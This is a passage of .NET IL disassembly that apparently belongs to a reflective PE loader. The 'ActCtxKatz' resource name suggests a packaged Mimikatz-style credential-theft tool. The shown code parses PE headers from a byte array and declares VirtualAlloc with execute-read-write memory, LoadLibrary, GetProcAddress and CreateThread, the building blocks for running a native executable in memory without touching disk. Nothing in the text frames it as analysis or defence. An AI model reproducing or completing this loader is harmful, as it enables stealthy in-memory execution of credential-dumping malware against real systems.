    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ldarg.1
    IL_0009:  ldc.i4.0
    IL_000a:  ldarg.1
    IL_000b:  ldlen
    IL_000c:  conv.i4
    IL_000d:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0012:  stloc.0
    .try
    {
      IL_0013:  nop
      IL_0014:  ldloc.0
      IL_0015:  newobj     instance void [mscorlib]System.IO.BinaryReader::.ctor(class [mscorlib]System.IO.Stream)
      IL_001a:  stloc.1
      IL_001b:  ldarg.0
      IL_001c:  ldloc.1
      IL_001d:  call       !!0 PELoader.PELoader::FromBinaryReader<valuetype PELoader.PELoader/IMAGE_DOS_HEADER>(class [mscorlib]System.IO.BinaryReader)
      IL_0022:  stfld      valuetype PELoader.PELoader/IMAGE_DOS_HEADER PELoader.PELoader::dosHeader
      IL_0027:  ldloc.0
      IL_0028:  ldarg.0
      IL_0029:  ldflda     valuetype PELoader.PELoader/IMAGE_DOS_HEADER PELoader.PELoader::dosHeader
      IL_002e:  ldfld      uint32 PELoader.PELoader/IMAGE_DOS_HEADER::e_lfanew
      IL_0033:  conv.u8
      IL_0034:  ldc.i4.0
      IL_0035:  callvirt   instance int64 [mscorlib]System.IO.Stream::Seek(int64,
                                                                           valuetype [mscorlib]System.IO.SeekOrigin)
      IL_003a:  pop
      IL_003b:  ldloc.1
      IL_003c:  callvirt   instance uint32 [mscorlib]System.IO.BinaryReader::ReadUInt32()
      IL_0041:  stloc.2
      IL_0042:  ldarg.0
      IL_0043:  ldloc.1
      IL_0044:  call       !!0 PELoader.PELoader::FromBinaryReader<valuetype PELoader.PELoader/IMAGE_FILE_HEADER>(class [mscorlib]System.IO.BinaryReader)
      IL_0049:  stfld      valuetype PELoader.PELoader/IMAGE_FILE_HEADER PELoader.PELoader::fileHeader
      IL_004e:  ldarg.0
      IL_004f:  call       instance bool PELoader.PELoader::get_Is32BitHeader()
      IL_0054:  ldc.i4.0
      IL_0055:  ceq
      IL_0057:  stloc.s    V_4
      IL_0059:  ldloc.s    V_4
      IL_005b:  brtrue.s   IL_006d

      IL_005d:  nop
      IL_005e:  ldarg.0
      IL_005f:  ldloc.1
      IL_0060:  call       !!0 PELoader.PELoader::FromBinaryReader<valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER32>(class [mscorlib]System.IO.BinaryReader)
      IL_0065:  stfld      valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER32 PELoader.PELoader::optionalHeader32
      IL_006a:  nop
      IL_006b:  br.s       IL_007b

      IL_006d:  nop
      IL_006e:  ldarg.0
      IL_006f:  ldloc.1
      IL_0070:  call       !!0 PELoader.PELoader::FromBinaryReader<valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER64>(class [mscorlib]System.IO.BinaryReader)
      IL_0075:  stfld      valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER64 PELoader.PELoader::optionalHeader64
      IL_007a:  nop
      IL_007b:  ldarg.0
      IL_007c:  ldarg.0
      IL_007d:  ldflda     valuetype PELoader.PELoader/IMAGE_FILE_HEADER PELoader.PELoader::fileHeader
      IL_0082:  ldfld      uint16 PELoader.PELoader/IMAGE_FILE_HEADER::NumberOfSections
      IL_0087:  newarr     PELoader.PELoader/IMAGE_SECTION_HEADER
      IL_008c:  stfld      valuetype PELoader.PELoader/IMAGE_SECTION_HEADER[] PELoader.PELoader::imageSectionHeaders
      IL_0091:  ldc.i4.0
      IL_0092:  stloc.3
      IL_0093:  br.s       IL_00b2

      IL_0095:  nop
      IL_0096:  ldarg.0
      IL_0097:  ldfld      valuetype PELoader.PELoader/IMAGE_SECTION_HEADER[] PELoader.PELoader::imageSectionHeaders
      IL_009c:  ldloc.3
      IL_009d:  ldelema    PELoader.PELoader/IMAGE_SECTION_HEADER
      IL_00a2:  ldloc.1
      IL_00a3:  call       !!0 PELoader.PELoader::FromBinaryReader<valuetype PELoader.PELoader/IMAGE_SECTION_HEADER>(class [mscorlib]System.IO.BinaryReader)
      IL_00a8:  stobj      PELoader.PELoader/IMAGE_SECTION_HEADER
      IL_00ad:  nop
      IL_00ae:  ldloc.3
      IL_00af:  ldc.i4.1
      IL_00b0:  add
      IL_00b1:  stloc.3
      IL_00b2:  ldloc.3
      IL_00b3:  ldarg.0
      IL_00b4:  ldfld      valuetype PELoader.PELoader/IMAGE_SECTION_HEADER[] PELoader.PELoader::imageSectionHeaders
      IL_00b9:  ldlen
      IL_00ba:  conv.i4
      IL_00bb:  clt
      IL_00bd:  stloc.s    V_4
      IL_00bf:  ldloc.s    V_4
      IL_00c1:  brtrue.s   IL_0095

      IL_00c3:  ldarg.0
      IL_00c4:  ldarg.1
      IL_00c5:  stfld      uint8[] PELoader.PELoader::rawbytes
      IL_00ca:  nop
      IL_00cb:  leave.s    IL_00df

    }  // end .try
    finally
    {
      IL_00cd:  ldloc.0
      IL_00ce:  ldnull
      IL_00cf:  ceq
      IL_00d1:  stloc.s    V_4
      IL_00d3:  ldloc.s    V_4
      IL_00d5:  brtrue.s   IL_00de

      IL_00d7:  ldloc.0
      IL_00d8:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_00dd:  nop
      IL_00de:  endfinally
    }  // end handler
    IL_00df:  nop
    IL_00e0:  nop
    IL_00e1:  ret
  } // end of method PELoader::.ctor

  .method public hidebysig static !!T  FromBinaryReader<T>(class [mscorlib]System.IO.BinaryReader reader) cil managed
  {
    // Code size       73 (0x49)
    .maxstack  2
    .locals init (uint8[] V_0,
             valuetype [mscorlib]System.Runtime.InteropServices.GCHandle V_1,
             !!T V_2,
             !!T V_3)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldtoken    !!T
    IL_0007:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_000c:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::SizeOf(class [mscorlib]System.Type)
    IL_0011:  callvirt   instance uint8[] [mscorlib]System.IO.BinaryReader::ReadBytes(int32)
    IL_0016:  stloc.0
    IL_0017:  ldloc.0
    IL_0018:  ldc.i4.3
    IL_0019:  call       valuetype [mscorlib]System.Runtime.InteropServices.GCHandle [mscorlib]System.Runtime.InteropServices.GCHandle::Alloc(object,
                                                                                                                                              valuetype [mscorlib]System.Runtime.InteropServices.GCHandleType)
    IL_001e:  stloc.1
    IL_001f:  ldloca.s   V_1
    IL_0021:  call       instance native int [mscorlib]System.Runtime.InteropServices.GCHandle::AddrOfPinnedObject()
    IL_0026:  ldtoken    !!T
    IL_002b:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_0030:  call       object [mscorlib]System.Runtime.InteropServices.Marshal::PtrToStructure(native int,
                                                                                                 class [mscorlib]System.Type)
    IL_0035:  unbox.any  !!T
    IL_003a:  stloc.2
    IL_003b:  ldloca.s   V_1
    IL_003d:  call       instance void [mscorlib]System.Runtime.InteropServices.GCHandle::Free()
    IL_0042:  nop
    IL_0043:  ldloc.2
    IL_0044:  stloc.3
    IL_0045:  br.s       IL_0047

    IL_0047:  ldloc.3
    IL_0048:  ret
  } // end of method PELoader::FromBinaryReader

  .method public hidebysig specialname instance bool 
          get_Is32BitHeader() cil managed
  {
    // Code size       28 (0x1c)
    .maxstack  2
    .locals init (uint16 V_0,
             bool V_1)
    IL_0000:  nop
    IL_0001:  ldc.i4     0x100
    IL_0006:  stloc.0
    IL_0007:  ldloc.0
    IL_0008:  ldarg.0
    IL_0009:  call       instance valuetype PELoader.PELoader/IMAGE_FILE_HEADER PELoader.PELoader::get_FileHeader()
    IL_000e:  ldfld      uint16 PELoader.PELoader/IMAGE_FILE_HEADER::Characteristics
    IL_0013:  and
    IL_0014:  ldloc.0
    IL_0015:  ceq
    IL_0017:  stloc.1
    IL_0018:  br.s       IL_001a

    IL_001a:  ldloc.1
    IL_001b:  ret
  } // end of method PELoader::get_Is32BitHeader

  .method public hidebysig specialname instance valuetype PELoader.PELoader/IMAGE_FILE_HEADER 
          get_FileHeader() cil managed
  {
    // Code size       12 (0xc)
    .maxstack  1
    .locals init (valuetype PELoader.PELoader/IMAGE_FILE_HEADER V_0)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldfld      valuetype PELoader.PELoader/IMAGE_FILE_HEADER PELoader.PELoader::fileHeader
    IL_0007:  stloc.0
    IL_0008:  br.s       IL_000a

    IL_000a:  ldloc.0
    IL_000b:  ret
  } // end of method PELoader::get_FileHeader

  .method public hidebysig specialname instance valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER32 
          get_OptionalHeader32() cil managed
  {
    // Code size       12 (0xc)
    .maxstack  1
    .locals init (valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER32 V_0)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldfld      valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER32 PELoader.PELoader::optionalHeader32
    IL_0007:  stloc.0
    IL_0008:  br.s       IL_000a

    IL_000a:  ldloc.0
    IL_000b:  ret
  } // end of method PELoader::get_OptionalHeader32

  .method public hidebysig specialname instance valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER64 
          get_OptionalHeader64() cil managed
  {
    // Code size       12 (0xc)
    .maxstack  1
    .locals init (valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER64 V_0)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldfld      valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER64 PELoader.PELoader::optionalHeader64
    IL_0007:  stloc.0
    IL_0008:  br.s       IL_000a

    IL_000a:  ldloc.0
    IL_000b:  ret
  } // end of method PELoader::get_OptionalHeader64

  .method public hidebysig specialname instance valuetype PELoader.PELoader/IMAGE_SECTION_HEADER[] 
          get_ImageSectionHeaders() cil managed
  {
    // Code size       12 (0xc)
    .maxstack  1
    .locals init (valuetype PELoader.PELoader/IMAGE_SECTION_HEADER[] V_0)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldfld      valuetype PELoader.PELoader/IMAGE_SECTION_HEADER[] PELoader.PELoader::imageSectionHeaders
    IL_0007:  stloc.0
    IL_0008:  br.s       IL_000a

    IL_000a:  ldloc.0
    IL_000b:  ret
  } // end of method PELoader::get_ImageSectionHeaders

  .method public hidebysig specialname instance uint8[] 
          get_RawBytes() cil managed
  {
    // Code size       12 (0xc)
    .maxstack  1
    .locals init (uint8[] V_0)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldfld      uint8[] PELoader.PELoader::rawbytes
    IL_0007:  stloc.0
    IL_0008:  br.s       IL_000a

    IL_000a:  ldloc.0
    IL_000b:  ret
  } // end of method PELoader::get_RawBytes

  .property instance bool Is32BitHeader()
  {
    .get instance bool PELoader.PELoader::get_Is32BitHeader()
  } // end of property PELoader::Is32BitHeader
  .property instance valuetype PELoader.PELoader/IMAGE_FILE_HEADER
          FileHeader()
  {
    .get instance valuetype PELoader.PELoader/IMAGE_FILE_HEADER PELoader.PELoader::get_FileHeader()
  } // end of property PELoader::FileHeader
  .property instance valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER32
          OptionalHeader32()
  {
    .get instance valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER32 PELoader.PELoader::get_OptionalHeader32()
  } // end of property PELoader::OptionalHeader32
  .property instance valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER64
          OptionalHeader64()
  {
    .get instance valuetype PELoader.PELoader/IMAGE_OPTIONAL_HEADER64 PELoader.PELoader::get_OptionalHeader64()
  } // end of property PELoader::OptionalHeader64
  .property instance valuetype PELoader.PELoader/IMAGE_SECTION_HEADER[]
          ImageSectionHeaders()
  {
    .get instance valuetype PELoader.PELoader/IMAGE_SECTION_HEADER[] PELoader.PELoader::get_ImageSectionHeaders()
  } // end of property PELoader::ImageSectionHeaders
  .property instance uint8[] RawBytes()
  {
    .get instance uint8[] PELoader.PELoader::get_RawBytes()
  } // end of property PELoader::RawBytes
} // end of class PELoader.PELoader

.class private auto ansi beforefieldinit PELoader.NativeDeclarations
       extends [mscorlib]System.Object
{
  .class sequential ansi sealed nested public beforefieldinit IMAGE_BASE_RELOCATION
         extends [mscorlib]System.ValueType
  {
    .field public uint32 VirtualAdress
    .field public uint32 SizeOfBlock
  } // end of class IMAGE_BASE_RELOCATION

  .class sequential ansi sealed nested public beforefieldinit IMAGE_IMPORT_DESCRIPTOR
         extends [mscorlib]System.ValueType
  {
    .field public uint32 OriginalFirstThunk
    .field public uint32 TimeDateStamp
    .field public uint32 ForwarderChain
    .field public uint32 Name
    .field public uint32 FirstThunk
  } // end of class IMAGE_IMPORT_DESCRIPTOR

  .field public static uint32 MEM_COMMIT
  .field public static uint32 MEM_RESERVE
  .field public static uint32 PAGE_EXECUTE_READWRITE
  .field public static uint32 PAGE_READWRITE
  .method public hidebysig static pinvokeimpl("kernel32" winapi) 
          native int  VirtualAlloc(native int lpStartAddr,
                                   uint32 size,
                                   uint32 flAllocationType,
                                   uint32 flProtect) cil managed preservesig
  {
  }
  .method public hidebysig static pinvokeimpl("kernel32.dll" unicode lasterr winapi) 
          native int  LoadLibrary(string lpFileName) cil managed preservesig
  {
  }
  .method public hidebysig static pinvokeimpl("kernel32.dll" nomangle ansi lasterr winapi) 
          native int  GetProcAddress(native int hModule,
                                     string procName) cil managed preservesig
  {
  }
  .method public hidebysig static pinvokeimpl("kernel32" winapi) 
          native int  CreateThread(native int lpThreadAttributes,
                                   uint32 dwStackSize,
                                   native int lpStartAddress,
                                   native int param,
                                   uint32 dwCreationFlags,
                                   native int lpThreadId) cil managed preservesig
  {
  }
  .method public hidebysig static pinvokeimpl("kernel32" winapi) 
          uint32  WaitForSingleObject(native int hHandle,
                                      uint32 dwMilliseconds) cil managed preservesig
  {
  }
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method NativeDeclarations::.ctor

  .method private hidebysig specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       34 (0x22)
    .maxstack  8
    IL_0000:  ldc.i4     0x1000
    IL_0005:  stsfld     uint32 PELoader.NativeDeclarations::MEM_COMMIT
    IL_000a:  ldc.i4     0x2000
    IL_000f:  stsfld     uint32 PELoader.NativeDeclarations::MEM_RESERVE
    IL_0014:  ldc.i4.s   64
    IL_0016:  stsfld     uint32 PELoader.NativeDeclarations::PAGE_EXECUTE_READWRITE
    IL_001b:  ldc.i4.4
    IL_001c:  stsfld     uint32 PELoader.NativeDeclarations::PAGE_READWRITE
    IL_0021:  ret
  } // end of method NativeDeclarations::.cctor

} // end of class PELoader.NativeDeclarations


// =============================================================

// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file ActCtxKatz.res
